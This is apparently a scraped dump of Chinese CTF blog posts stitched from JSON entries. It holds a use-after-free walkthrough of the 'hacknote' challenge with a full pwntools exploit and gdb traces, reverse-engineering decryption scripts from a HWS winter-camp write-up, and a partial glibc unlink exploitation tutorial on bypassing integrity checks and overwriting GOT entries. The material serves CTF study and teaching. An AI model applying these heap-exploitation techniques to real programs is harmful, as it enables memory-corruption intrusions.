[esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) { puts(&quot;Out of bound!&quot;); _exit(0); } if ( notelist[v1] ) { free(notelist[v1]-&gt;content); free(notelist[v1]); puts(&quot;Success&quot;); } return __readgsdword(0x14u) ^ v3;} magicint magic(){ return system(&quot;cat /home/hacknote/flag&quot;);} 利用分析我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个 magic 函数，我们有没有可能来通过 use after free 来使得这个程序执行 magic 函数呢？一个很直接的想法是修改 note 的 put 字段为 magic 函数的地址，从而实现在执行 print note 的时候执行 magic 函数。 那么该怎么执行呢？ 我们可以简单来看一下每一个 note 生成的具体流程 程序申请 8 字节内存用来存放 note 中的 put 以及 content 指针。 程序根据输入的 size 来申请指定大小的内存，然后用来存储 content。 +-----------------+ | put | +-----------------+ | b* content | size +-----------------+-------------------&gt;+----------------+ | real | | content | | | +----------------+ 那么，根据我们之前在堆的实现中所学到的，显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下 申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可） 申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可） 释放 note0 释放 note1 此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0 申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则 note2 其实会分配 note1 对应的内存块。 real content 对应的 chunk 其实是 note0。 如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。 脚本#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *r = process('./hacknote')def addnote(size, content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content)def delnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def printnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))#gdb.attach(r)magic = 0x08048986addnote(32, &quot;aaaa&quot;) # add note 0addnote(32, &quot;ddaa&quot;) # add note 1delnote(0) # delete note 0delnote(1) # delete note 1addnote(8, p32(magic)) # add note 2printnote(0) # print note 0r.interactive() gdb进行调试看一下执行的流程，首先下断点 两处 malloc 下断点 gdb-peda$ b* 0x0804875CBreakpoint 1 at 0x804875cgdb-peda$ b *0x080486CABreakpoint 2 at 0x80486ca 两处 free 下断点 gdb-peda$ b *0x08048893Breakpoint 3 at 0x8048893gdb-peda$ b *0x080488A9Breakpoint 4 at 0x80488a9 然后继续执行程序，可以看出申请 note0 时，所申请到的内存块地址为 0x0924d008。（eax 存储函数返回值） $eax : 0x08a6a008 → 0x00000000$ebx : 0x0 $ecx : 0xf7f2e780 → 0x00000000$edx : 0x08a6a008 → 0x00000000$esp : 0xffa50030 → 0x00000008$ebp : 0xffa50068 → 0xffa50088 → 0x00000000$esi : 0xf7f2e000 → 0x001afdb0$edi : 0xf7f2e000 → 0x001afdb0$eip : 0x080486cf → &lt;add_note+89&gt; add esp, 0x10$eflags: [carry parity adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffa50030│+0x0000: 0x00000008 ← $esp0xffa50034│+0x0004: 0x000000000xffa50038│+0x0008: 0xf7dadc75 → &lt;strtol+5&gt; add eax, 0x18038b0xffa5003c│+0x000c: 0xf7dab070 → &lt;atoi+16&gt; add esp, 0x1c0xffa50040│+0x0010: 0xffa50078 → 0xffa50a31 → 0x000000000xffa50044│+0x0014: 0x000000000xffa50048│+0x0018: 0x0000000a0xffa5004c│+0x001c: 0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ──── 0x80486c2 &lt;add_note+76&gt; add DWORD PTR [eax], eax 0x80486c4 &lt;add_note+78&gt; add BYTE PTR [ebx+0x86a0cec], al 0x80486ca &lt;add_note+84&gt; call 0x80484e0 &lt;malloc@plt&gt;●→ 0x80486cf &lt;add_note+89&gt; add esp, 0x10 0x80486d2 &lt;add_note+92&gt; mov edx, eax 0x80486d4 &lt;add_note+94&gt; mov eax, DWORD PTR [ebp-0x1c] 0x80486d7 &lt;add_note+97&gt; mov DWORD PTR [eax*4+0x804a070], edx 0x80486de &lt;add_note+104&gt; mov eax, DWORD PTR [ebp-0x1c] 0x80486e1 &lt;add_note+107&gt; mov eax, DWORD PTR [eax*4+0x804a070]─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;hacknote&quot;, stopped 0x80486cf in add_note (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x80486cf → add_note()[#1] 0x8048ac5 → main()────────────────────────────────────────────────────────────────────────────────gef➤ heap chunk 0x08a6a008Chunk(addr=0x8a6a008, size=0x10, flags=PREV_INUSE)Chunk size: 16 (0x10)Usable size: 12 (0xc)Previous chunk size: 0 (0x0)PREV_INUSE flag: OnIS_MMAPPED flag: OffNON_MAIN_ARENA flag: Off 申请 note 0 的content 的地址为 0x08a6a018 $eax : 0x08a6a018 → 0x00000000$ebx : 0x08a6a008 → 0x0804865b → &lt;print_note_content+0&gt; push ebp$ecx : 0xf7f2e780 → 0x00000000$edx : 0x08a6a018 → 0x00000000$esp : 0xffa50030 → 0x00000020$ebp : 0xffa50068 → 0xffa50088 → 0x00000000$esi : 0xf7f2e000 → 0x001afdb0$edi : 0xf7f2e000 → 0x001afdb0$eip : 0x08048761 → &lt;add_note+235&gt; add esp, 0x10$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffa50030│+0x0000: 0x00000020 ← $esp0xffa50034│+0x0004: 0xffa50054 → 0xf70a32330xffa50038│+0x0008: 0x000000080xffa5003c│+0x000c: 0xf7dab070 → &lt;atoi+16&gt; add esp, 0x1c0xffa50040│+0x0010: 0xffa50078 → 0xffa50a31 → 0x000000000xffa50044│+0x0014: 0x000000000xffa50048│+0x0018: 0x0000000a0xffa5004c│+0x001c: 0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ──── 0x8048752 &lt;add_note+220&gt; mov al, ds:0x458b0804 0x8048757 &lt;add_note+225&gt; call 0x581173df 0x804875c &lt;add_note+230&gt; call 0x80484e0 &lt;malloc@plt&gt;●→ 0x8048761 &lt;add_note+235&gt; add esp, 0x10 0x8048764 &lt;add_note+238&gt; mov DWORD PTR [ebx+0x4], eax 0x8048767 &lt;add_note+241&gt; mov eax, DWORD PTR [ebp-0x1c] 0x804876a &lt;add_note+244&gt; mov eax, DWORD PTR [eax*4+0x804a070] 0x8048771 &lt;add_note+251&gt; mov eax, DWORD PTR [eax+0x4] 0x8048774 &lt;add_note+254&gt; test eax, eax─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;hacknote&quot;, stopped 0x8048761 in add_note (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x8048761 → add_note()[#1] 0x8048ac5 → main()────────────────────────────────────────────────────────────────────────────────gef➤ heap chunk 0x08a6a018Chunk(addr=0x8a6a018, size=0x28, flags=PREV_INUSE)Chunk size: 40 (0x28)Usable size: 36 (0x24)Previous chunk size: 0 (0x0)PREV_INUSE flag: OnIS_MMAPPED flag: OffNON_MAIN_ARENA flag: Off 类似的，我们可以得到 note1 的地址以及其 content 的地址分别为 0x08a6a040 和 0x08a6a050。 同时，我们还可以看到 note0 与 note1 对应的 content 确实是相应的内存块。 gef➤ grep aaaa[+] Searching 'aaaa' in memory[+] In '[heap]'(0x8a6a000-0x8a8b000), permission=rw- 0x8a6a018 - 0x8a6a01e → &quot;aaaa\\n&quot; gef➤ grep ddaa[+] Searching 'ddaa' in memory[+] In '[heap]'(0x8a6a000-0x8a8b000), permission=rw- 0x8a6a050 - 0x8a6a056 → &quot;ddaa\\n&quot; 下面就是 free 的过程了。我们可以依次发现首先，note0 的 content 被 free ●→ 0x8048893 &lt;del_note+143&gt; call 0x80484c0 &lt;free@plt&gt; ↳ 0x80484c0 &lt;free@plt+0&gt; jmp DWORD PTR ds:0x804a018 0x80484c6 &lt;free@plt+6&gt; push 0x18 0x80484cb &lt;free@plt+11&gt; jmp 0x8048480 0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp DWORD PTR ds:0x804a01c 0x80484d6 &lt;__stack_chk_fail@plt+6&gt; push 0x20 0x80484db &lt;__stack_chk_fail@plt+11&gt; jmp 0x8048480─────────────────────────────────────────────────────── arguments (guessed) ────free@plt ( [sp + 0x0] = 0x08a6a018 → &quot;aaaa\\n&quot;, 然后是 note0 本身 ●→ 0x80488a9 &lt;del_note+165&gt; call 0x80484c0 &lt;free@plt&gt; ↳ 0x80484c0 &lt;free@plt+0&gt; jmp DWORD PTR ds:0x804a018 0x80484c6 &lt;free@plt+6&gt; push 0x18 0x80484cb &lt;free@plt+11&gt; jmp 0x8048480 0x80484d0 &lt;__stack_chk_fail@plt+0&gt; jmp DWORD PTR ds:0x804a01c 0x80484d6 &lt;__stack_chk_fail@plt+6&gt; push 0x20 0x80484db &lt;__stack_chk_fail@plt+11&gt; jmp 0x8048480─────────────────────────────────────────────────────── arguments (guessed) ────free@plt ( [sp + 0x0] = 0x08a6a008 → 0x0804865b → &lt;print_note_content+0&gt; push ebp, 当我们将 note1 也全部删除完毕后，再次观看 bins。可以看出，后删除的 chunk 块确实处于表头。 gef➤ heap bins[+] No Tcache in this version of libc──────────────────────── Fastbins for arena 0xf7f2e780 ────────────────────────Fastbins[idx=0, size=0x10] ← Chunk(addr=0x8a6a008, size=0x10, flags=PREV_INUSE) Fastbins[idx=1, size=0x18] 0x00Fastbins[idx=2, size=0x20] 0x00Fastbins[idx=3, size=0x28] ← Chunk(addr=0x8a6a050, size=0x28, flags=PREV_INUSE) ← Chunk(addr=0x8a6a018, size=0x28, flags=PREV_INUSE) Fastbins[idx=4, size=0x30] 0x00Fastbins[idx=5, size=0x38] 0x00Fastbins[idx=6, size=0x40] 0x00───────────────────── Unsorted Bin for arena '*0xf7f2e780' ─────────────────────[+] Found 0 chunks in unsorted bin.────────────────────── Small Bins for arena '*0xf7f2e780' ──────────────────────[+] Found 0 chunks in 0 small non-empty bins.────────────────────── Large Bins for arena '*0xf7f2e780' ──────────────────────[+] Found 0 chunks in 0 large non-empty bins. 那么，此时即将要申请 note2，我们可以看下 note2 都申请到了什么内存块，如下 申请 note2 对应的内存块为 0x08a6a040，其实就是 note1 对应的内存地址。 $eax : 0x08a6a040 → 0x08a6a000 → 0x00000000$ebx : 0x0 $ecx : 0xf7f2e780 → 0x00000000$edx : 0x08a6a040 → 0x08a6a000 → 0x00000000$esp : 0xffa50030 → 0x00000008$ebp : 0xffa50068 → 0xffa50088 → 0x00000000$esi : 0xf7f2e000 → 0x001afdb0$edi : 0xf7f2e000 → 0x001afdb0$eip : 0x080486cf → &lt;add_note+89&gt; add esp, 0x10$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffa50030│+0x0000: 0x00000008 ← $esp0xffa50034│+0x0004: 0x08048c63 → &quot;Your choice :&quot;0xffa50038│+0x0008: 0xf7dadc75 → &lt;strtol+5&gt; add eax, 0x18038b0xffa5003c│+0x000c: 0xf7dab070 → &lt;atoi+16&gt; add esp, 0x1c0xffa50040│+0x0010: 0xffa50078 → 0xffa50a31 → 0x000000000xffa50044│+0x0014: 0x000000000xffa50048│+0x0018: 0x0000000a0xffa5004c│+0x001c: 0x00000002─────────────────────────────────────────────────────────────── code:x86:32 ──── 0x80486c2 &lt;add_note+76&gt; add DWORD PTR [eax], eax 0x80486c4 &lt;add_note+78&gt; add BYTE PTR [ebx+0x86a0cec], al 0x80486ca &lt;add_note+84&gt; call 0x80484e0 &lt;malloc@plt&gt;●→ 0x80486cf &lt;add_note+89&gt; add esp, 0x10 0x80486d2 &lt;add_note+92&gt; mov edx, eax 0x80486d4 &lt;add_note+94&gt; mov eax, DWORD PTR [ebp-0x1c] 0x80486d7 &lt;add_note+97&gt; mov DWORD PTR [eax*4+0x804a070], edx 0x80486de &lt;add_note+104&gt; mov eax, DWORD PTR [ebp-0x1c] 0x80486e1 &lt;add_note+107&gt; mov eax, DWORD PTR [eax*4+0x804a070]─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;hacknote&quot;, stopped 0x80486cf in add_note (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x80486cf → add_note()[#1] 0x8048ac5 → main() 申请 note2 的 content 的内存地址为 0x08a6a008，就是 note0 对应的地址，即此时我们向 note2 的 content 写内容，就会将 note0 的 put 字段覆盖。 $eax : 0x08a6a008 → 0x00000000$ebx : 0x08a6a040 → 0x0804865b → &lt;print_note_content+0&gt; push ebp$ecx : 0xf7f2e780 → 0x00000000$edx : 0x08a6a008 → 0x00000000$esp : 0xffa50030 → 0x00000008$ebp : 0xffa50068 → 0xffa50088 → 0x00000000$esi : 0xf7f2e000 → 0x001afdb0$edi : 0xf7f2e000 → 0x001afdb0$eip : 0x08048761 → &lt;add_note+235&gt; add esp, 0x10$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffa50030│+0x0000: 0x00000008 ← $esp0xffa50034│+0x0004: 0xffa50054 → 0xf7e50a38 → &lt;pwrite64+120&gt; hlt 0xffa50038│+0x0008: 0x000000080xffa5003c│+0x000c: 0xf7dab070 → &lt;atoi+16&gt; add esp, 0x1c0xffa50040│+0x0010: 0xffa50078 → 0xffa50a31 → 0x000000000xffa50044│+0x0014: 0x000000000xffa50048│+0x0018: 0x0000000a0xffa5004c│+0x001c: 0x00000002─────────────────────────────────────────────────────────────── code:x86:32 ──── 0x8048752 &lt;add_note+220&gt; mov al, ds:0x458b0804 0x8048757 &lt;add_note+225&gt; call 0x581173df 0x804875c &lt;add_note+230&gt; call 0x80484e0 &lt;malloc@plt&gt;●→ 0x8048761 &lt;add_note+235&gt; add esp, 0x10 0x8048764 &lt;add_note+238&gt; mov DWORD PTR [ebx+0x4], eax 0x8048767 &lt;add_note+241&gt; mov eax, DWORD PTR [ebp-0x1c] 0x804876a &lt;add_note+244&gt; mov eax, DWORD PTR [eax*4+0x804a070] 0x8048771 &lt;add_note+251&gt; mov eax, DWORD PTR [eax+0x4] 0x8048774 &lt;add_note+254&gt; test eax, eax─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;hacknote&quot;, stopped 0x8048761 in add_note (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0x8048761 → add_note()[#1] 0x8048ac5 → main() 我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的 put 指针已经被置为 NULL 了，这是由 fastbin 的 free 机制决定的。 gef➤ x/2xw 0x08a6a0080x8a6a008: 0x00000000 0x08a6a018 覆盖后，具体的值如下 gef➤ x/2xw 0x08a6a0080x8a6a008: 0x08048986 0x08a6a00agef➤ x/i 0x08048986 0x8048986 &lt;magic&gt;: push ebp 最后执行效果如下 [+] Starting local process './hacknote': pid 3232[*] running in new terminal: /usr/bin/gdb -q &quot;./hacknote&quot; 3232[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)[*] Switching to interactive modeflag{use_after_free}---------------------- HackNote ---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- 同时，我们还可以借助 gef 的 heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下 gef➤ heap-analysis-helper[*] This feature is under development, expect bugs and unstability...[+] Tracking malloc() &amp; calloc()[+] Tracking free()[+] Tracking realloc()[+] Disabling hardware watchpoints (this may increase the latency)[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.[*] Note: The heap analysis slows down the execution noticeably.gef➤ cContinuing.[+] Heap-Analysis - __libc_malloc(8)=0x9bba008[+] Heap-Analysis - __libc_malloc(8)=0x9bba008[+] Heap-Analysis - __libc_malloc(32)=0x9bba018[+] Heap-Analysis - __libc_malloc(8)=0x9bba040[+] Heap-Analysis - __libc_malloc(32)=0x9bba050[+] Heap-Analysis - free(0x9bba018)[+] Heap-Analysis - free(0x9bba008)[+] Heap-Analysis - free(0x9bba050)[+] Heap-Analysis - free(0x9bba040)[+] Heap-Analysis - __libc_malloc(8)=0x9bba040[+] Heap-Analysis - __libc_malloc(8)=0x9bba008 这里第一个输出了两次，应该是 gef 工具的问题。 题目 2016 HCTF fheap","link":"/2021/01/27/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/Linux-Pwn/Use-After-Free/"},{"title":"2020-HWS-冬令营线上赛WP","text":"本次线上赛赛题只有四类：固件、内核、逆向、Pwn。比赛完参考轩哥和线上师傅的博客进行复现，其中固件题目与IoT实战结合紧密，难度总体来说不大，入门友好型赛题。 HWS冬令营介绍：HWS计划2021硬件安全冬令营重磅回归！ 入营赛题目附件：HWS20210128.zip Reversedecryption x86windows 考点： 加法的位运算实现 单子节爆破 主要加密逻辑： 12345678910111213141516for ( i = 0; i &lt;= 31; ++i ){ v2 = i ^ a2[i]; v3 = i &amp; a2[i]; v7 = a2[i]; v6 = i; do { v4 = 2 * (v6 &amp; v7); v7 ^= v6; v6 = v4; } while ( v4 ); result = &amp;a1[i]; a1[i] = v7 ^ 0x23;} 方法一加密算法无法一眼看出对应的运算，直接写脚本进行爆破 123456789101112131415161718192021buf = [0x12, 0x45, 0x10, 0x47, 0x19, 0x49, 0x49, 0x49, 0x1A, 0x4F, 0x1C, 0x1E, 0x52, 0x66, 0x1D, 0x52, 0x66, 0x67, 0x68, 0x67, 0x65, 0x6F, 0x5F, 0x59, 0x58, 0x5E, 0x6D, 0x70, 0xA1, 0x6E, 0x70, 0xA3]flag = &quot;&quot;for i in range(0x20): for j in range(0xff): v6 = i v7 = j while 1: v4 = 2 * (v6 &amp; v7) v7 = v7 ^ v6 v6 = v4 if v4 == 0: break if v7 ^ 0x23 == buf[i]: flag += chr(j) breakprint(&quot;flag{%s}&quot; % flag) 方法二如果了解过加法的位运算实现的话，可以发现encrypt函数实际上是把对应input[i]加上i在异或，我们可以写出对应的逆运算： 1234567891011121314#include &lt;cstdio&gt;#include &lt;cstring&gt;char decrypt(char c1,int i){ return (c1 ^ 0x23) - i;}int main(){ char buf[40] = &quot;\\x12\\x45\\x10\\x47\\x19\\x49\\x49\\x49\\x1A\\x4F\\x1C\\x1E\\x52\\x66\\x1D\\x52\\x66\\x67\\x68\\x67\\x65\\x6F\\x5F\\x59\\x58\\x5E\\x6D\\x70\\xA1\\x6E\\x70\\xA3&quot;; for(int i = 0; i &lt; 32; i++){ putchar(decrypt(buf[i],i)); } printf(&quot;\\n&quot;);} ofbuKernel第一次做内核，基础学习文章如下： Linux Kernel Basics linux内核基础 Linux Kernel 环境配置及调试 Linux Kernel Pwn 学习笔记(栈溢出) HWS夏令营 之 GDB调一切: 调试linux内核 基础练习题目如下： 练习文章：Linux Kernel Pwn 初探 配套题目：链接:https://pan.baidu.com/s/1yuefRhjs2KTxK2f_sC4cUA 密码:q58k 进阶练习题目如下：ISCN2017 - babydriver、2018 强网杯 - core、2018 0CTF Finals Baby Kernel Linux Kernel UAF CISCN2017 - babydriver Linux Kernel bypass-smep CISCN2017 - babydriver Linux Kernel ROP 2018 强网杯 - core Linux Kernel ret2usr 2018 强网杯 - core Linux Kernel Double Fetch 2018 0CTF Finals Baby Kernel easy_kernel逻辑总共为4个步骤 输入flag 加载驱动，调用驱动中的函数加密flag 长调用，加密密文 Check，对比结果 驱动调用 查看驱动 最终调用的加密函数是驱动的sub_401340 参数分别是ring3传进来的 sub_401005(-1, &amp;v7, aAglfTTon5iSiht, 32, v4, &amp;Buf1); V7是输入的flag，Buf1是加密的结果，aAglfTTon5iSiht是字符串常量}aglf_T_ton_5i_sihT_yrroS{galf，32是长度 依据相关的加密算法的特征，可判别sub_401710是des spankey函数，sub_401620是des encrypt函数 长调用利用call fwrod 返回用 retf 调用的是ring3下图的函数，功能很简单，就是一个简单的xor 解密脚本如下 123456789101112from Crypto.Cipher import DESfrom hashlib import md5key='}aglf_T_ton_5i_sihT_yrroS{galf'[:8]c=[0xB2, 0xC4, 0x86, 0xD5, 0x54, 0x6C, 0x38, 0xAD, 0xBD, 0x69, 0xD4, 0xE9, 0x44, 0x47, 0x36, 0x21, 0x99, 0x91, 0xFB, 0x13, 0x70, 0xD8, 0x6B, 0xE4, 0x80, 0x12, 0xE2, 0x43, 0x2A, 0x4B, 0x49, 0x8E]for i in range(0x1e,-1,-1): c[i]^=c[i+1]cipher=''.join(list(map(chr,c)))des=DES.new(key)flag=des.decrypt(cipher)print(flag)print(md5(flag).hexdigest()) 参考链接：https://xuanxuanblingbling.github.io/ctf/pwn/2021/02/01/hws/#","link":"/2021/02/13/CTF/HWS/2020-HWS-%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BA%BF%E4%B8%8A%E8%B5%9BWP/"},{"title":"Unlink","text":"原理我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。 我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下 下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。 古老的unlink在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码。 // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (&quot;corrupted size vs. prev_size&quot;); \\// 检查 fd 和 bk 指针(双向链表完整性检查)if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); \\ // largebin 中 next_size 双向链表完整性检查 if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \\ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ &quot;corrupted double-linked list (not small)&quot;, \\ P, AV); 这里我们以 32 位为例，假设堆内存最初的布局是下面的样子 现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（比如溢出）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时 glibc 判断这个块是 small chunk 判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并 判断后向合并，发现后一个 chunk 处于空闲状态，需要合并 继而对 Nextchunk 采取 unlink 操作 那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下 FD=P-&gt;fd = target addr -12 BK=P-&gt;bk = expect value FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12 看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。 比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。 当前的 unlink但是，现实是残酷的。。我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查 // fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); \\ 此时 FD-&gt;bk = target addr - 12 + 12=target_addr BK-&gt;fd = expect value + 8 那么我们上面所利用的修改 GOT 表项的方法就可能不可用了。但是我们可以通过伪造的方式绕过这个机制。 首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要 fakeFD -&gt; bk == P &lt;=&gt; *(fakeFD + 12) == P fakeBK -&gt; fd == P &lt;=&gt; *(fakeBK + 8) == P 当满足上述两式时，可以进入 Unlink 的环节，进行如下操作： fakeFD -&gt; bk = fakeBK &lt;=&gt; *(fakeFD + 12) = fakeBK fakeBK -&gt; fd = fakeFD &lt;=&gt; *(fakeBK + 8) = fakeFD 如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么： *P = P - 8 *P = P - 12 即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。 如果我们想要使得两者都指向 P，只需要按照如下方式修改即可 需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。 // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (&quot;corrupted size vs. prev_size&quot;); \\ 此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。 利用思路条件 UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针 已知位置存在一个指针指向可进行 UAF 的 chunk 效果使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18 思路设指向可 UAF chunk 的指针的地址为 ptr 修改 fd 为 ptr - 0x18 修改 bk 为 ptr - 0x10 触发 unlink ptr 处的指针会变为 ptr - 0x18。 例题 2014 HITCON stkof题目链接 查看基本信息如下 可以看出程序为64位 主要开启了 Canary和NX保护 Partial RELRO，可以修改got表 基本功能如下程序存在 4 个功能，经过 IDA 分析后可以分析功能如下 alloc：输入 size，分配 size 大小的内存，并在 bss 段记录对应 chunk 的指针，假设其为 global read_in：根据指定索引，向分配的内存处读入数据，数据长度可控，这里存在堆溢出的情况 free：根据指定索引，释放已经分配的内存块 useless：这个功能并没有什么卵用，本来以为是可以输出内容，结果什么也没有输出 函数信息如下main函数 __int64 __fastcall main(__int64 a1, char **a2, char **a3){ int choice; // eax signed int v5; // [rsp+Ch] [rbp-74h] char nptr; // [rsp+10h] [rbp-70h] unsigned __int64 v7; // [rsp+78h] [rbp-8h] v7 = __readfsqword(0x28u); alarm(0x78u); while ( fgets(&amp;nptr, 10, stdin) ) { choice = atoi(&amp;nptr); if ( choice == 2 ) { v5 = fill(); goto LABEL_14; } if ( choice &gt; 2 ) { if ( choice == 3 ) { v5 = free_chunk(); goto LABEL_14; } if ( choice == 4 ) { v5 = print(); goto LABEL_14; } } else if ( choice == 1 ) { v5 = alloc(); goto LABEL_14; } v5 = -1;LABEL_14: if ( v5 ) puts(&quot;FAIL&quot;); else puts(&quot;OK&quot;); fflush(stdout); } return 0LL;} 用于控制数据流将 stdin转化为整型，根据输入的调用不同函数 输入1即进入alloc()函数 signed __int64 alloc(){ __int64 size; // [rsp+0h] [rbp-80h] char *v2; // [rsp+8h] [rbp-78h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v4; // [rsp+78h] [rbp-8h] v4 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); size = atoll(&amp;s); v2 = (char *)malloc(size); if ( !v2 ) return 0xFFFFFFFFLL; globals[++cnt] = v2; printf(&quot;%d\\n&quot;, (unsigned int)cnt, size); return 0LL;} 将stdin转换为整型作为size，然后malloc堆空间，返回的地址根据索引存入globals，且有++cnt，因此索引从1开始。 输入2即进入fill()函数 signed __int64 fill(){ signed __int64 result; // rax int i; // eax unsigned int idx; // [rsp+8h] [rbp-88h] __int64 size; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); idx = atol(&amp;s); if ( idx &gt; 1048576 ) return 0xFFFFFFFFLL; if ( !globals[idx] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); size = atoll(&amp;s); ptr = globals[idx]; for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) ) { ptr += i; size -= i; } if ( size ) result = 0xFFFFFFFFLL; else result = 0LL; return result;} 根据索引在globals数组获取地址，并通过修改堆的内容，size可控并且没有限制长度，存在堆溢出漏洞。 输入3 进入free_chunk()函数 signed __int64 free_chunk(){ unsigned int idx; // [rsp+Ch] [rbp-74h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v3; // [rsp+78h] [rbp-8h] v3 = __readfsqword(0x28u); 